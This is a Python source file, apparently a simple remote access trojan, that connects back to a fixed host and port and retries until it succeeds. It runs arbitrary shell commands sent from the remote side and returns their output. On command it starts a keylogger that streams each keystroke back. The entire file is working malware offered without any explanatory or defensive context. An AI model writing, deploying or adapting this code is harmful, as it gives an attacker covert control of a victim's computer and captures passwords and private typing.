import keyboard
import socket, time, threading, json, subprocess, os

def run_command(comando):
    global pwd
    if comando[:3] == "cd ":
        result = subprocess.run(comando+"&& cd", shell=True, text=True, capture_output=True, cwd=pwd)
        saida = result.stdout
        erro = result.stderr

        if saida != "":
            pwd = saida.strip()
        elif erro != "":
            send_data("comando",erro)
    elif comando == "clear":
        None
    else:
        result = subprocess.run(comando, shell=True, text=True, capture_output=True, cwd=pwd)
        saida = result.stdout
        erro = result.stderr

        if saida != "":
            send_data("comando",saida)
        elif erro != "":
            send_data("comando",erro)

def send_data(key,data):
    raw_packet = {key:data}
    packet = json.dumps(raw_packet)
    try:
        sock.send(packet.encode())
    except OSError:
        None

def recv_data():
    global monitorar, pwd
    pwd = "/"
    monitorar = False
    while True:
        try:
            raw_data = sock.recv(1024)
        except ConnectionAbortedError, ConnectionResetError:
            monitorar = False
            keyboard.unhook_all()
            sock.close()
            break
        if not raw_data:
            monitorar = False
            sock.close()
            keyboard.unhook_all()
            break
        else:
            comando = raw_data.decode()
            if comando == "start keylogger":
                monitorar = True
                send_data("alerta","Iniciando monitoramento ao vivo!")
                t = threading.Thread(target=keylogger,)
                t.start()
            elif comando == "stop keylogger":
                if monitorar == False:
                    send_data("alerta","Monitoramento ao vivo não ativo!")
                else:
                    monitorar == False
                    send_data("alerta","Monitoramento ao vivo desativado!")
                    keyboard.unhook_all()
            elif comando == "exit":
                sock.close()
                break
            else:
                run_command(comando)
                

def keylogger():
    def evento(e):
        if e.event_type == keyboard.KEY_DOWN:
           try:
               tecla = e.name
               send_data("tecla",tecla)
           except ConnectionAbortedError: 
               monitorar = False
               keyboard.unhook_all()

    keyboard.hook(evento)
    while monitorar:
        pass

def try_connect():
    while True:
        try:
            sock = socket.socket()
            sock.connect(("192.168.1.123", 8080))
            return sock
        except ConnectionRefusedError:
            print("Esperando 2 seg..")
            time.sleep(2)
            


while True:
    sock = try_connect()
    recv_data()
